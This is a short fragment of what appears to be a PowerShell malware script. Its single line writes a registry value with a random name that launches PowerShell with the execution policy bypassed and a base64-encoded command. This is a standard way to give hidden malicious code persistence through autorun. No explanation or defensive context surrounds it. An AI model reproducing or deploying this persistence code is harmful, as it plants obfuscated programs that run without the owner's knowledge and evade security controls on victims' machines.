...
New-ItemProperty -Path $regPath -Name "$randomString" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand $c1" -PropertyType String -Force | Out-Null
